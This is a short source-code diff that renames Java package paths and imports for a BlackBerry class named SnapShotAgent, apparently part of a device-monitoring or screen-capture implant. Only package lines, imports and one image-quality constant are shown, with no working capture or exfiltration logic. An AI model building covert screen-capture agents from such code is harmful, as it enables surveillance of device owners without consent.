@@ -1,4 +1,4 @@
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
 import java.io.EOFException;
 
@@ -8,14 +8,14 @@ import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
 
-import com.ht.rcs.blackberry.fs.AutoFlashFile;
-import com.ht.rcs.blackberry.fs.Path;
-import com.ht.rcs.blackberry.log.Log;
-import com.ht.rcs.blackberry.log.LogType;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.WChar;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
+import blackberry.log.Log;
+import blackberry.log.LogType;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.WChar;
 
 public class SnapShotAgent extends Agent {
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
